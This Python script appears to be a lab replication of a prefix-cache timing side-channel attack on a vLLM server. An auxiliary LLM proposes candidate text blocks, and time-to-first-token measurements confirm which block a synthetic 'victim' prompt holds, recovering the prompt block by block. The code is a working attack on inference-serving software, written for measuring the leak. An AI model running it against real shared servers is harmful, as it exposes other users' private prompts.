#!/usr/bin/env python
"""Experiment 9 - real-hardware block-granular prefix recovery (EarlyBird / PROMPTPEEK).

Block-granular (block_size=16) content recovery on the LIVE vLLM server. An
auxiliary LLM (the same server) proposes candidate next-blocks ranked by logprob;
the prefix-cache TTFT oracle confirms which candidate the victim actually holds.
"LM proposes, cache disposes" (EarlyBird 2409.20002 / InputSnatch 2411.18191 /
PROMPTPEEK NDSS 2025).

Isolation WITHOUT /reset_prefix_cache (this navi build exposes no reset route):
  * Victim is primed AND probed under a fixed VICTIM_SALT on the CHAT endpoint,
    so the probe oracle only sees the victim's namespace.
  * Candidate GENERATION runs on plain /completions - a physically disjoint cache
    namespace - so generation cannot pollute the probe. (cache_salt is honored on
    chat, confirmed in Exp 04/06.)
  * Each candidate is probed ONCE (distinct 16-token blocks don't cross-contaminate).

Decision is pure timing (min TTFT < calibrated threshold). Ground truth
(true-text match, hits_delta) is recorded ONLY to score.
"""
from __future__ import annotations
import argparse, random, statistics, string, sys, time, uuid
from pathlib import Path
import requests
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
from cachelab.config import Config
from cachelab.client import TimingClient
from cachelab.groundtruth import labeled_request
from cachelab.server import wait_until_healthy
from cachelab.io_utils import new_run_dir, save_json

BLOCK = 16


def gen_text(base_url, model, prompt, max_tokens, temperature=0.0):
    payload = {"model": model, "prompt": prompt, "max_tokens": max_tokens,
               "temperature": temperature, "n": 1, "stream": False}
    r = requests.post(f"{base_url}/completions", json=payload, timeout=120)
    r.raise_for_status()
    return r.json()["choices"][0]["text"]


def gen_candidates(base_url, model, prefix, k, block_tokens):
    """[(text, logprob_score)] unique candidate next-blocks, most-likely first.
    Runs on plain /completions -> caches in a namespace disjoint from the chat+salt
    probe namespace, so it cannot pollute the oracle."""
    cands = {}
    for n, temp in ((1, 0.0), (max(k - 1, 0), 0.8)):
        if n <= 0:
            continue
        payload = {"model": model, "prompt": prefix, "max_tokens": block_tokens,
                   "temperature": temp, "n": n, "stream": False, "logprobs": 1}
        try:
            r = requests.post(f"{base_url}/completions", json=payload, timeout=120)
            r.raise_for_status()
        except Exception as e:
            print(f"      [gen error: {e}]")
            continue
        for c in r.json().get("choices", []):
            text = c.get("text") or ""
            lp = (c.get("logprobs") or {}).get("token_logprobs") or []
            score = sum(x for x in lp if x is not None)
            if text and (text not in cands or score > cands[text]):
                cands[text] = score
    return sorted(cands.items(), key=lambda kv: kv[1], reverse=True)


def prime_victim(client, cfg, victim_text, salt):
    """Prime the victim under its chat+salt namespace (keeps it cached there)."""
    client.measure(cfg.model.name, victim_text, max_tokens=1,
                   user="victim_user", cache_salt=salt, chat=True)
    time.sleep(cfg.timing.inter_request_delay)


def probe_once(client, cfg, text, salt):
    """One labeled probe in the victim's chat+salt namespace -> (ttft, hits_delta)."""
    with labeled_request(cfg) as box:
        m = client.measure(cfg.model.name, text, max_tokens=1,
                           user="attacker_user", cache_salt=salt, chat=True)
    hd = box[0].hits_delta if box[0] else None
    time.sleep(cfg.timing.inter_request_delay)
    return (m.client_ttft if m.ok else None), hd


def probe_avg(client, cfg, text, salts):
    """Average a probe over R disjoint cache namespaces to pull a sub-jitter
    block signal out of noise. Each (text, salt) pair is probed once, so every
    measurement is a clean first-probe (no self-caching). Returns (median_ttft,
    first hits_delta)."""
    ts, hd0 = [], None
    for i, s in enumerate(salts):
        t, hd = probe_once(client, cfg, text, s)
        if t is not None:
            ts.append(t)
        if i == 0:
            hd0 = hd
    return (statistics.median(ts) if ts else None), hd0


def calibrate(client, cfg, known, salts):
    """Hit = probe known (cached prefix); miss = probe known + a fresh random block,
    each averaged over the salt pool."""
    hit_t, _ = probe_avg(client, cfg, known, salts)
    miss_ts = []
    for _ in range(3):
        t, _ = probe_avg(client, cfg, known + " " + uuid.uuid4().hex, salts)
        if t is not None:
            miss_ts.append(t)
    if hit_t is None or not miss_ts:
        return None
    mm = statistics.median(miss_ts)
    return (hit_t + mm) / 2.0 if mm > hit_t else None


def recover(client, cfg, base_url, known, victim_text, salts, n_blocks, k, threshold):
    """Greedy, logprob-ordered block recovery. Returns (correct_blocks, probes, recovered_text)."""
    recovered = known
    probes = correct = 0
    for b in range(n_blocks):
        cands = gen_candidates(base_url, cfg.model.name, recovered, k, BLOCK)  # LM proposes
        for s_ in salts:
            prime_victim(client, cfg, victim_text, s_)            # keep victim warm in every namespace
        best = best_t = best_hd = None
        for cand, _lp in cands:                                               # cache disposes
            t, hd = probe_avg(client, cfg, recovered + cand, salts)
            probes += 1
            if t is None:
                continue
            if best_t is None or t < best_t:
                best, best_t, best_hd = cand, t, hd
        if best is None or best_t >= threshold:
            bt = None if best_t is None else round(best_t * 1000, 1)
            print(f"      block {b}: STALL (best ttft={bt}ms >= thr={round(threshold*1000,1)}ms, "
                  f"{len(cands)} cands)")
            break
        recovered += best
        true_match = victim_text.startswith(recovered)
        print(f"      block {b}: {'OK  ' if true_match else 'WRONG'} "
              f"ttft={best_t*1000:.1f}ms hits_delta={best_hd} +{best[:28]!r}")
        if true_match:
            correct += 1
        else:
            break
    return correct, probes, recovered[len(known):]


def main() -> int:
    a = argparse.ArgumentParser()
    a.add_argument("--config", default="config/replication.yaml")
    a.add_argument("--blocks", type=int, default=4)
    a.add_argument("--k", type=int, default=8)
    a.add_argument("--repeats", type=int, default=1, help="salt namespaces averaged per probe (R)")
    args = a.parse_args()
    cfg = Config.load(args.config)
    print("[*] waiting for vLLM server health...")
    if not wait_until_healthy(cfg):
        print("[!] server not healthy", file=sys.stderr)
        return 1
    client = TimingClient(cfg.server.base_url)
    base_url = cfg.server.base_url
    print(f"[*] isolation: chat+cache_salt victim namespace; generation on plain /completions")
    print(f"[*] signal amplification: averaging each probe over R={args.repeats} cache namespaces")

    results = []
    try:
        for regime in ("predictable", "random"):
            tag = uuid.uuid4().hex
            salts = [f"victim-{regime}-{tag}-ns{i}" for i in range(max(args.repeats, 1))]
            prefix = f"{tag} The following is a standard disclosure notice. Section 1:"
            if regime == "predictable":
                target = gen_text(base_url, cfg.model.name, prefix, args.blocks * BLOCK, temperature=0.0)
            else:
                target = " " + " ".join("".join(random.choice(string.ascii_lowercase) for _ in range(5))
                                        for _ in range(args.blocks * BLOCK))
            victim_text = prefix + target
            for s_ in salts:
                prime_victim(client, cfg, victim_text, s_)
            thr = calibrate(client, cfg, prefix, salts)
            if thr is None:
                print(f"\n=== {regime} ===\n    [!] no usable hit/miss timing separation; skipping")
                continue
            print(f"\n=== {regime} regime (threshold {thr*1000:.1f}ms) ===")
            correct, probes, rec = recover(client, cfg, base_url, prefix, victim_text, salts,
                                           args.blocks, args.k, thr)
            per = probes / max(args.blocks, 1)
            print(f"    --> recovered {correct}/{args.blocks} blocks  ({probes} probes, ~{per:.0f}/block)")
            print(f"    recovered text: {rec[:120]!r}")
            results.append({"regime": regime, "blocks_recovered": correct,
                            "blocks_total": args.blocks, "probes": probes,
                            "threshold_ms": round(thr * 1000, 2), "recovered": rec})
    finally:
        client.close()

    run_dir = new_run_dir("runs")
    save_json({"experiment": "09_block_recovery", "model": cfg.model.name,
               "block_size": BLOCK, "k": args.k, "isolation": "chat_cache_salt_namespace",
               "results": results}, run_dir / "block_recovery.json")
    print(f"\n[*] wrote {run_dir/'block_recovery.json'}")
    print("\n    Reading: predictable (low-entropy) content recovers block-by-block via")
    print("    LM-proposed candidates + the cache oracle; random (high-entropy) stalls.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
